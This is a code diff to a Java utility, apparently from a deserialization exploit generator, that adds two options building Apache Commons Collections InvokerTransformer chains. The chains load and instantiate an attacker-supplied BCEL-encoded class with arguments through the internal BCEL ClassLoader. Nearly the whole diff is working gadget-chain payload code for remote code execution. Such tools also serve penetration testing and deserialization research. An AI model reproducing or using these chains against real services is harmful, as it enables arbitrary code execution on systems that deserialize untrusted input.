@@ -91,6 +91,34 @@ public class CommonsCollectionsUtil {
                 new InvokerTransformer("newInstance", new Class[0], new Object[0]),
                 new ConstantTransformer(Integer.valueOf(1))
             };
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_WITH_ARGS)){
+            String tmp = command.substring(CustomCommand.COMMAND_BCEL_WITH_ARGS.length());
+            String bcelStr = tmp.split("\\|")[0] ;
+            String bcelArgs = tmp.split("\\|")[1];
+            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
+            transformers = new Transformer[]{
+                new ConstantTransformer(bcelClazz),
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
+                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
+                new ConstantTransformer(Integer.valueOf(1))
+            };
+        } else if(command.toLowerCase().startsWith(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS)){
+            String tmp = command.substring(CustomCommand.COMMAND_BCEL_CLASS_FILE_WITH_ARGS.length());
+            String bcelStr = HackBCELs.encode(tmp.split("\\|")[0]);
+            String bcelArgs = tmp.split("\\|")[1];
+            Class bcelClazz = CommonUtil.getClass("com.sun.org.apache.bcel.internal.util.ClassLoader");
+            transformers = new Transformer[]{
+                new ConstantTransformer(bcelClazz),
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{}}),
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{}}),
+                new InvokerTransformer("loadClass", new Class[]{String.class}, new Object[]{bcelStr}),
+                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}),
+                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new String[]{bcelArgs}}),
+                new ConstantTransformer(Integer.valueOf(1))
+            };
         } else if (command.toLowerCase().startsWith(CustomCommand.COMMAND_SCRIPT_FILE)){
             // new javax.script.ScriptEngineManager().getEngineByName("js").eval("script_code");
             String scriptFilePath = command.substring(CustomCommand.COMMAND_SCRIPT_FILE.length());
